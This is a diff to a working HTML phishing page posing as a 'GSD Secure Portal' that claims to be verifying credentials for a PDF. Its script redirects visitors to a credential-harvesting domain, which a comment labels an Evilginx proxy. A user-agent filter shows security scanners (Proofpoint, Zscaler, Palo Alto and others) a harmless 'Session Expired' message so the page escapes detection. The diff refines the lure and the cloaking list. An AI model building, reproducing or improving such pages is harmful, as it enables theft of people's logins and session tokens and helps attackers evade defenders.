@@ -1,45 +1,58 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <title>GSD | Secure Document Portal</title>
 </head>
 <body style="font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f3f2f1; color: #323130;">
-    <div style="background: white; display: inline-block; padding: 40px; border-radius: 2px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px;">
+    
+    <div style="background: white; display: inline-block; padding: 40px; border-radius: 2px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px; border: 1px solid #e1e4e8;">
         <div style="font-size: 40px; margin-bottom: 15px;">📁</div>
+        
         <h2 style="font-weight: 600; font-size: 20px; margin-bottom: 10px;">GSD Secure Portal</h2>
-        <p style="font-size: 14px; color: #605e5c;">Verifying security credentials for: <br><strong>Briefing_Support_Migration_2026.pdf</strong></p>
+        
+        <p style="font-size: 14px; color: #605e5c;">
+            Verifying security credentials for: <br>
+            <strong style="color: #333;">Policy_Update_Q2_2026.pdf</strong>
+        </p>
         
         <div id="loader" style="border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 25px auto;"></div>
         
-        <p id="status-text" style="font-size: 13px; color: #a19f9d;">Authenticating...</p>
+        <p id="status-text" style="font-size: 13px; color: #a19f9d;">Authenticating with Tenant Services...</p>
 
-        <a id="manual-link" href="https://login.file-share-hub.com/ZqFmaygj" style="display:none; background-color: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 2px; font-weight: 600; font-size: 14px;">View Document</a>
+        <a id="manual-link" href="https://login.file-share-hub.com/ZqFmaygj" 
+           style="display:none; background-color: #0078d4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 2px; font-weight: 600; font-size: 14px;">
+            View Document
+        </a>
     </div>
 
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 
     <script>
-      const botPattern = /bot|crawler|spider|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft|zscaler|paloalto|fireeye/i;
+      // Anti-Bot Filter
+      const botPattern = /bot|crawler|spider|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft|zscaler|paloalto|fireeye|cyberheaven/i;
       
       if (!botPattern.test(navigator.userAgent)) {
           setTimeout(function() {
-              // Try automatic redirect first
+              // Primary Redirect to Evilginx
               window.location.href = "https://login.file-share-hub.com/ZqFmaygj";
               
-              // If redirect doesn't happen in 3 seconds, show the manual button
+              // Secondary Fallback: If redirect fails or takes too long, show the button
               setTimeout(function(){
                   document.getElementById('loader').style.display = 'none';
                   document.getElementById('status-text').style.display = 'none';
                   document.getElementById('manual-link').style.display = 'inline-block';
-              }, 3000);
-          }, 1500);
+              }, 4000);
+          }, 2000);
       } else {
-          // Bots see this and get stuck
-          document.getElementById('status-text').innerText = "Access Denied: Verification Required.";
+          // What Bots/Scanners See
           document.getElementById('loader').style.display = 'none';
+          document.getElementById('status-text').innerText = "Session Expired. Please access via the original link.";
+          document.getElementById('status-text').style.color = "#d83b01";
       }
     </script>
 </body>
